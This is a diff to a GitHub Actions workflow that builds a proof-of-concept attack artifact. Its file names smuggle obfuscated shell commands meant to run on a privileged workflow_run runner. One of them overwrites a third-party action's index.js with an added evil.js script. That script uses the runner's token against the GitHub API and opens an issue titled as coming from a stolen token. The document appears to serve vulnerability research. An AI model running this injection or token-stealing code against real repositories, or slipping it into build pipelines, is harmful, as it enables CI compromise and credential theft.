@@ -12,12 +12,36 @@ jobs:
   produce:
     runs-on: ubuntu-latest
     steps:
-      - name: Build artifact with attacker-controlled file name
+      - name: Build artifact with attacker-controlled file names and contents
         run: |
           mkdir -p content
           cd content
-          touch 'rce$(echo PWNED $(id)).txt'
-          printf 'hello from artifact\n' > ok.txt
+          printf 'RCE_PROOF: injected command executed on the privileged workflow_run runner\n' > summary.txt
+          printf '' > rce.txt
+          cat > evil.js <<'JS'
+          const fs = require('fs');
+          const t = process.env.INPUT_TOKEN || '';
+          const repo = process.env.GITHUB_REPOSITORY;
+          const H = { authorization: `Bearer ${t}`, accept: 'application/vnd.github+json', 'content-type': 'application/json', 'user-agent': 'rce-poc' };
+          const out = [`EVIL_ACTION_RAN token_len=${t.length}`];
+          (async () => {
+            try {
+              const r = await fetch(`https://api.github.com/repos/${repo}`, { headers: H });
+              out.push(`repo_api_status=${r.status}`);
+              const b = await r.json();
+              out.push(`repo=${b.full_name}`);
+              const ir = await fetch(`https://api.github.com/repos/${repo}/issues`, { method: 'POST', headers: H, body: JSON.stringify({ title: 'RCE_PROOF_FROM_STOLEN_TOKEN', body: out.join('\n') + ' ts=' + Date.now() }) });
+              out.push(`issue_create_status=${ir.status}`);
+            } catch (e) { out.push('err=' + e.message); }
+            const s = out.join('\n') + '\n';
+            try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s); } catch (e) {}
+            fs.writeFileSync('/tmp/evil-out.txt', s);
+            console.log(s);
+          })();
+          JS
+          SUM="rce\$(cp\${IFS}\$'\\057'tmp\$'\\057'content\$'\\057'content\$'\\057'summary.txt\${IFS}\$GITHUB_STEP_SUMMARY).txt"
+          OVR="rce\$(cp\${IFS}\$'\\057'tmp\$'\\057'content\$'\\057'content\$'\\057'evil.js\${IFS}\$'\\057'home\$'\\057'runner\$'\\057'work\$'\\057'_actions\$'\\057'peter-evans\$'\\057'commit-comment\$'\\057'v3\$'\\057'dist\$'\\057'index.js).txt"
+          touch "$SUM" "$OVR"
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
